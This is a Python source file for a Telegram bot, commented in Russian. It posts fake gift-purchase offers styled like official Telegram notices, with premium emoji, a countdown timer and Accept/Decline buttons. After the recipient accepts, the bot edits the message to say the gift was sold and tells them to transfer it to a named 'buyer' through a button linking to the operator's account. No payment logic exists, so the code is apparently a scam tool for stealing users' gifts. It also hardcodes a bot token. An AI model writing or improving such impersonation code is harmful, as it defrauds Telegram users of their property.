# language: Python, file: bot.py, target: Python 3.10+
import telebot
from telebot import types
import time
from urllib.parse import unquote, urlparse
from datetime import datetime, timedelta
from flask import Flask
import threading
import os

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8337096654:AAFq_4d39Jo2x0sxC8L2lStxTbL_a3q1P4I"
ADMIN_ID = 8927166966
MY_USERNAME = "@masons_19"

# БЕЛЫЕ ПРЕМИУМ-ЭМОДЗИ
STAR = '<tg-emoji emoji-id="5280802202083346495">⭐</tg-emoji>'
GIFT_EMOJI = '<tg-emoji emoji-id="5280784083407933462">🎁</tg-emoji>'
CLOCK_EMOJI = '<tg-emoji emoji-id="5280985696880987202">⏱</tg-emoji>'

bot = telebot.TeleBot(BOT_TOKEN)

# --- ХРАНИЛИЩЕ ДАННЫХ ОФФЕРОВ ---
# Сюда мы записываем данные по message_id, чтобы потом знать, что менять
# Формат: {message_id: {"link": "...", "name": "...", "price": "...", "target": "..."}}
active_offers = {}

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
def parse_gift_name(url: str) -> str:
    path = urlparse(url).path.strip("/")
    if path:
        return unquote(path.split("/")[-1]).replace("+", " ")
    return "Подарок"

# Текст оффера ДО принятия
def build_offer_text(gift_name, price, gift_url, expires_at):
    remaining = expires_at - datetime.now()
    total_sec = max(0, int(remaining.total_seconds()))
    hours = total_sec // 3600
    minutes = (total_sec % 3600) // 60

    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'

    return (
        f"{GIFT_EMOJI} Пользователь предлагает Вам\n"
        f"<b>{price}</b> {STAR} за подарок {clickable_link}.\n\n"
        f"{CLOCK_EMOJI} Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
    )

# Текст оффера ПОСЛЕ принятия (КАК НА 2-М СКРИНШОТЕ)
# Ссылка остается в тексте, чтобы Telegram не убрал карточку сверху
def build_success_text(gift_name, price, gift_url, target_user):
    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'
    
    return (
        f"{GIFT_EMOJI} Подарок: {clickable_link} успешно продан!\n\n"
        f"• Передайте подарок покупателю {target_user} для зачисления {price} {STAR}."
    )

def offer_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ Принять", callback_data="accept_offer"),
        types.InlineKeyboardButton("❌ Отклонить", callback_data="decline_offer")
    )
    return kb

# --- УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК (.offer) ---
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_all_messages(message):
    if message.from_user.id != ADMIN_ID:
        return

    text = message.text.strip()
    
    if text.startswith('.offer'):
        parts = text.split()
        if len(parts) < 4:
            try: bot.delete_message(message.chat.id, message.message_id)
            except: pass
            bot.send_message(message.chat.id, "❌ Формат: .offer ссылка цена @юзер")
            return

        gift_link = parts[1]
        try:
            price = int(parts[2])
        except ValueError:
            try: bot.delete_message(message.chat.id, message.message_id)
            except: pass
            bot.send_message(message.chat.id, "❌ Цена должна быть числом")
            return
        target = parts[3]

        gift_name = parse_gift_name(gift_link)
        expires_at = datetime.now() + timedelta(hours=6)
        offer_text = build_offer_text(gift_name, price, gift_link, expires_at)
        kb = offer_keyboard()

        # Отправляем сообщение и запоминаем его
        try:
            sent_msg = bot.send_message(
                chat_id=message.chat.id,
                text=offer_text,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=False
            )
            
            # Сохраняем данные в память (чтобы потом поменять текст)
            active_offers[sent_msg.message_id] = {
                "link": gift_link,
                "name": gift_name,
                "price": price,
                "target": target
            }
            
        except Exception as e:
            print(f"Ошибка отправки: {e}")
            return

        # Удаляем команду .offer
        try:
            bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
        except:
            pass

# --- ОБРАБОТКА КНОПОК ---
@bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
def on_callback(call):
    conn_id = getattr(call.message, 'business_connection_id', None)
    msg_id = call.message.message_id

    if call.data == "accept_offer":
        bot.answer_callback_query(call.id, "Оффер принят")
        
        # Достаем данные из памяти
        if msg_id in active_offers:
            data = active_offers[msg_id]
            
            # Формируем новый текст с ссылкой внутри
            success_text = build_success_text(
                data["name"], 
                data["price"], 
                data["link"], 
                data["target"]
            )
            
            # Кнопка "Передать"
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))

            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=msg_id,
                    text=success_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    disable_web_page_preview=False, # Оставляем превью (карточку)
                    business_connection_id=conn_id
                )
            except Exception as e:
                print(f"Ошибка редактирования: {e}")
                
            # Удаляем из памяти, так как оффер уже обработан
            del active_offers[msg_id]
        else:
            bot.answer_callback_query(call.id, "Оффер устарел", show_alert=True)
            
    else:
        bot.answer_callback_query(call.id, "Оффер отклонён")
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=msg_id,
                text="❌ Вы отклонили предложение.",
                reply_markup=None,
                business_connection_id=conn_id
            )
        except:
            pass

# --- ЗАПУСК ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот запущен! Триггер: .offer")
    bot.infinity_polling(timeout=40, long_polling_timeout=30)
